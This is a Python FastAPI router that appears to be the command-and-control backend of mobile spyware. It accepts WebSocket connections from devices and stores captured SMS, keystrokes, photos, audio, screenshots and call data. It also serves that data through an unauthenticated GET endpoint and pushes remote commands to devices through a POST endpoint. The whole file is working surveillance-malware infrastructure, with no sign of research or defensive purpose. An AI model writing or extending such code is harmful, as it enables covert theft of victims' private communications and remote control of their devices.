from fastapi import APIRouter, WebSocket, WebSocketDisconnect
import json
from datetime import datetime

router = APIRouter()

connected_devices = {}
captured_data = {}

@router.websocket("/ws/{device_id}")
async def websocket_endpoint(websocket: WebSocket, device_id: str):
    await websocket.accept()
    
    # Store connection
    connected_devices[device_id] = websocket
    if device_id not in captured_data:
        captured_data[device_id] = []
    
    print(f"✅ Device connected via WebSocket: {device_id}")
    
    try:
        while True:
            msg = await websocket.receive_text()
            data = json.loads(msg)
            
            msg_type = data.get("type", "")
            
            if msg_type == "heartbeat":
                # Update device status
                pass
            elif msg_type in ["sms", "keystroke", "photo", "audio", "screenshot", "call"]:
                captured_data[device_id].append({
                    "type": msg_type,
                    "data": data.get("data", {}),
                    "timestamp": datetime.utcnow().isoformat()
                })
                # Keep last 500
                if len(captured_data[device_id]) > 500:
                    captured_data[device_id] = captured_data[device_id][-500:]
                    
    except WebSocketDisconnect:
        print(f"🔴 Device disconnected: {device_id}")
    finally:
        if device_id in connected_devices:
            del connected_devices[device_id]


@router.get("/ws/data/{device_id}")
async def get_ws_data(device_id: str, data_type: str = "all"):
    data = captured_data.get(device_id, [])
    if data_type != "all":
        data = [d for d in data if d["type"] == data_type]
    return {"data": data[-100:]}


@router.post("/ws/send/{device_id}")
async def send_ws_command(device_id: str, command: dict):
    if device_id in connected_devices:
        ws = connected_devices[device_id]
        await ws.send_text(json.dumps({
            "type": "command",
            "command": command
        }))
        return {"status": "sent"}
    return {"status": "offline"}
